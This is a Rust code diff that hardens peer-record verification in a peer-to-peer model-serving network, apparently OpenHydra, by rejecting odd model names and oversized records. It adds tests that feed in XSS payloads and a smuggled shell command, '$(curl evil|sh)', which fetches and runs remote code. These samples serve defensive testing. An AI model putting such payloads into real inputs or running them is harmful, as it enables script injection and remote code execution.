@@ -2,6 +2,7 @@
 
 use libp2p::kad;
 use openhydra_protocol::crypto_agility::SigAlg;
+use openhydra_protocol::model_id::is_valid_canonical_field;
 
 use crate::types::PeerRecord;
 
@@ -146,6 +147,10 @@ fn base64_urlsafe_decode(s: &str) -> Result<Vec<u8>, String> {
 /// poisoning + routing-table address injection).  Never panics on malformed
 /// input — all decode failures return `Err`.
 pub fn verify_peer_record(record: &PeerRecord) -> Result<(), String> {
+    // A signature proves who sent a record, not that its contents are sane. Model names travel
+    // into other nodes' UIs, gateways and coding tools, so a record with an odd name or an
+    // oversized body is refused like a forged one.
+    check_record_content(record)?;
     if record.signature.is_empty() || record.public_key.is_empty() {
         return Err("missing signature or public_key".into());
     }
@@ -193,6 +198,25 @@ pub fn verify_peer_record(record: &PeerRecord) -> Result<(), String> {
     } else {
         Err("signature verification failed".into())
     }
+}
+
+/// Largest signed record body accepted; honest records are well under 1 KB.
+pub const MAX_RECORD_BYTES: usize = 4096;
+
+/// The content half of [`verify_peer_record`]: the model name and canonical id use only the
+/// characters real engine ids use (`openhydra_protocol::model_id::is_valid_model_id`), and the
+/// signed body is at most [`MAX_RECORD_BYTES`]. An empty `model_id` (a record that serves nothing) is left to callers.
+pub fn check_record_content(record: &PeerRecord) -> Result<(), String> {
+    if !is_valid_canonical_field(&record.model_id) {
+        return Err("model name has unsupported characters".into());
+    }
+    if !is_valid_canonical_field(&record.canonical_model_id) {
+        return Err("canonical model id has unsupported characters".into());
+    }
+    if canonical_bytes(record).len() > MAX_RECORD_BYTES {
+        return Err("record too large".into());
+    }
+    Ok(())
 }
 
 /// R-DHT-1 (gossip provider PEX): decide whether a provider record learned over
@@ -297,6 +321,47 @@ mod tests {
         let signed = sign_peer_record(&PeerRecord { peer_id: "anything".into(), ..record }, &victim).unwrap();
         assert_eq!(signed.peer_id, crate::identity::openhydra_peer_id(&victim.public().try_into_ed25519().unwrap().to_bytes()));
         verify_peer_record(&signed).unwrap();
+    }
+
+    #[test]
+    fn verify_refuses_a_validly_signed_record_with_a_hostile_model_name() {
+        let kp = libp2p::identity::Keypair::generate_ed25519();
+        for bad in [
+            "x\" onclick=\"alert(1)\"",
+            "<img src=x onerror=alert(1)>",
+            "~/$(curl evil|sh)/qwen.gguf",
+            "two\nlines",
+        ] {
+            let record = PeerRecord { peer_id: "oh-peer".into(), model_id: bad.into(), ..Default::default() };
+            let signed = sign_peer_record(&record, &kp).unwrap();
+            let err = verify_peer_record(&signed).unwrap_err();
+            assert!(err.contains("unsupported characters"), "{bad:?}: {err}");
+            assert!(pex_record_is_authentic(&signed, &signed.libp2p_peer_id).is_err());
+        }
+        let record = PeerRecord {
+            peer_id: "oh-peer".into(),
+            model_id: "qwen2.5:7b".into(),
+            canonical_model_id: "qwen\"2.5/7b/q4_k_m/9f2c8a1b4d6e0f37".into(),
+            ..Default::default()
+        };
+        assert!(verify_peer_record(&sign_peer_record(&record, &kp).unwrap()).is_err());
+    }
+
+    #[test]
+    fn verify_refuses_an_oversized_record_and_keeps_honest_ones() {
+        let kp = libp2p::identity::Keypair::generate_ed25519();
+        let big = PeerRecord {
+            peer_id: "oh-peer".into(),
+            model_id: "qwen2.5:7b".into(),
+            hardware_class: "x".repeat(MAX_RECORD_BYTES),
+            ..Default::default()
+        };
+        let err = verify_peer_record(&sign_peer_record(&big, &kp).unwrap()).unwrap_err();
+        assert!(err.contains("too large"), "{err}");
+        for ok in ["qwen2.5:7b", "hf.co/bartowski/Qwen2.5-7B-Instruct-GGUF:Q4_K_M", "flux1-dev workflow", ""] {
+            let record = PeerRecord { peer_id: "oh-peer".into(), model_id: ok.into(), ..Default::default() };
+            verify_peer_record(&sign_peer_record(&record, &kp).unwrap()).unwrap();
+        }
     }
 
     #[test]
